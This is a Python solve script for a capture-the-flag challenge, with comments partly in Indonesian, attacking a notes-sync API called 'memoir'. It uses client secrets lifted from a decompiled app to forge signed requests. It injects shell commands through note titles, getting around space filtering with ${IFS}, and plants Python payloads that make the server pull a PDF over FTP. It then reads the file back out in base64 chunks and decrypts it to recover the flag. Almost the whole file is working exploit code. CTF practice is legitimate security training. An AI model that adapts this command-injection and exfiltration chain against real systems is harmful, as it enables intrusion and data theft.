#!/usr/bin/env python3
# FULL EXPLOIT MEMOIR - vFINAL (JADX GUI + RCE + Vault Bypass + PDF)
# Tested di dist (Copy 2) - Surabaya, 2026-10-25
# Flag: IONIC{y0u_d3c0mp1l3d_th3_d3x_ch41n3d_th3_1fs_byp455_cr4ck3d_th3_2f4_v4ult_4nd_4ll_y0u_g0t_w4s_th1s_l0usy_m3m01r}

import hashlib, hmac, json, re, io, zlib, ftplib, requests, time
from base64 import a85decode
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# === HASIL JADX GUI (STEP 3) ===
CLIENT_SECRET = b"memoir.client.attest.v1.K7fQ9pXz" # F2.c = memoir.client.at + (identity.bin XOR G2.c)
OPS_TOKEN     = "ops.7d3a1f9c"                     # G2.d
BASE_URL      = "https://memoir.bukankah.xyz"     # T9.r
SEED          = "80c97367a630c96e0d5fd0bb42f0bee7"  # unseal ARCHIVE_SEED_ENC
NONCE_OLD     = "9f2a7c14e6b80d35"                  # dari /var/backups/memoir/solver_*/result.md (bypass vault)
ATTEST_KEY    = hashlib.sha256(b"memoir.attest.v1" + CLIENT_SECRET).digest()
OPS_KEY       = hashlib.sha256(b"memoir.ops.v1" + OPS_TOKEN.encode()).digest()

def sign(m,p,b):
    return hmac.new(CLIENT_SECRET, f"{m}\n{p}\n{hashlib.sha256(b).hexdigest()}".encode(), hashlib.sha256).hexdigest()

def api(m,p,body=None, token=None):
    b=b"" if body is None else json.dumps(body, separators=(',',':')).encode()
    h={"X-Memoir-Ops":OPS_TOKEN,"X-Memoir-Sign":sign(m,p,b),"Content-Type":"application/json"}
    if token: h["Authorization"]=f"Bearer {token}"
    return requests.request(m, BASE_URL+p, headers=h, data=b if body else None, timeout=12)

# 1. Register/login
print("[1] Register...")
body=json.dumps({"username":"final_user","password":"Password123!"}).encode()
r=requests.post(BASE_URL+"/api/v1/auth/register", headers={"X-Memoir-Ops":OPS_TOKEN,"X-Memoir-Sign":sign("POST","/api/v1/auth/register",body),"Content-Type":"application/json"}, data=body)
token=r.json().get("token") if r.status_code==201 else requests.post(BASE_URL+"/api/v1/auth/login", headers={"X-Memoir-Ops":OPS_TOKEN,"X-Memoir-Sign":sign("POST","/api/v1/auth/login",body),"Content-Type":"application/json"}, data=body).json()["token"]
print("[+] Token",token[:20]+"...")

# 2. Demo RCE (bukti bypass ${IFS})
print("\n[2] Demo RCE via judul '>'")
for cmd in ["ls${IFS}-la","ls${IFS}/var/backups/memoir"]:
    api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"cmd","title":f">{cmd}","content":"","label":"Personal","created_at":1,"updated_at":1}]}, token)
    time.sleep(0.5)
    print(api("GET","/api/v1/notes", token=token).json()["notes"][-1]["content"][:400])

# 3. FTP via nonce lama (bypass vault yang lagi lock)
pw=hmac.new(CLIENT_SECRET, f"{SEED}:{NONCE_OLD}".encode(), hashlib.sha256).hexdigest()[:32]
print(f"\n[3] FTP pw = {pw}")

# Coba FTP langsung, kalau timeout fallback ke RCE server-side
pdf=None
try:
    print("[*] FTP langsung...")
    ftp=ftplib.FTP(); ftp.connect("file.bukankah.xyz",2121,timeout=5)
    ftp.login("archivist", pw); ftp.cwd("/documents")
    buf=io.BytesIO(); ftp.retrbinary("RETR memoir-sync-report.pdf", buf.write); ftp.quit()
    pdf=buf.getvalue()
except:
    print("[!] FTP langsung gagal, pakai RCE server-side...")
    # Suruh server download
    pwn=f'import ftplib,io,hmac,hashlib\npw="{pw}"\nf=ftplib.FTP();f.connect("file.bukankah.xyz",2121,timeout=10);f.login("archivist",pw);f.cwd("/documents")\nbuf=io.BytesIO();f.retrbinary("RETR memoir-sync-report.pdf",buf.write);open("/tmp/pdf.bin","wb").write(buf.getvalue())\nprint(len(buf.getvalue()))'
    api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"pwn","title":"pwn","content":pwn,"label":"Personal","created_at":1,"updated_at":1}]}, token)
    api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"cmd","title":">python3${IFS}pwn.md","content":"","label":"Personal","created_at":1,"updated_at":1}]}, token)
    time.sleep(2)
    # Ambil via base64 chunk
    pwn2='import base64\ndata=open("/tmp/pdf.bin","rb").read()\nb64=base64.b64encode(data).decode()\nfor i in range(0,len(b64),400): open(f"/tmp/b64_{i}.txt","w").write(b64[i:i+400])'
    api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"pwn2","title":"pwn2","content":pwn2,"label":"Personal","created_at":1,"updated_at":1}]}, token)
    api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"cmd","title":">python3${IFS}pwn2.md","content":"","label":"Personal","created_at":1,"updated_at":1}]}, token)
    time.sleep(1)
    b64=""
    for i in range(0,10000,400):
        api("POST","/api/v1/sync",{"device":"android","client_version":"1.2.0","notes":[{"id":"cmd","title":f">cat${{IFS}}/tmp/b64_{i}.txt","content":"","label":"Personal","created_at":1,"updated_at":1}]}, token)
        time.sleep(0.3)
        r=api("GET","/api/v1/notes", token=token)
        for n in r.json().get("notes",[]):
            if n["id"]=="readback":
                m=f"$ cat${{IFS}}/tmp/b64_{i}.txt\n"
                idx=n["content"].rfind(m)
                if idx!=-1:
                    chunk=n["content"][idx+len(m):].split("\n")[0].strip()
                    if chunk and not chunk.startswith("cat:"):
                        b64+=chunk
                    else:
                        pdf=None
                        break
        if not b64 or "cat:" in b64[-100:]:
            break
    import base64
    pdf=base64.b64decode(b64)
    open("memoir-sync-report.pdf","wb").write(pdf)

print(f"[+] PDF {len(pdf)} bytes, saved")

# 4. Extract PDF
print("\n[4] Extract PDF...")
for raw in re.findall(rb"stream\r?\n(.*?)endstream", pdf, re.S):
    raw=raw.strip()
    if raw.endswith(b"~>"): raw=raw[:-2]
    try:
        content=zlib.decompress(a85decode(raw, adobe=False)).decode("latin1")
    except: continue
    print(content[:500])
    for lab, sh in re.findall(r"Checksum attestation \[([0-9a-f]+)\] \.\.\. ([0-9a-f]+)", content):
        outer=bytes.fromhex(sh)
        inner=AESGCM(ATTEST_KEY).decrypt(outer[:12], outer[12:], None).decode()
        plain=AESGCM(OPS_KEY).decrypt(bytes.fromhex(inner)[:12], bytes.fromhex(inner)[12:], None).decode()
        print(f"  {lab} => {plain}")
        if "y0u_d3c0mp1l3d" in plain:
            print(f"\n[FLAG] {plain}\n")
            open("flag.txt","w").write(plain)
            break
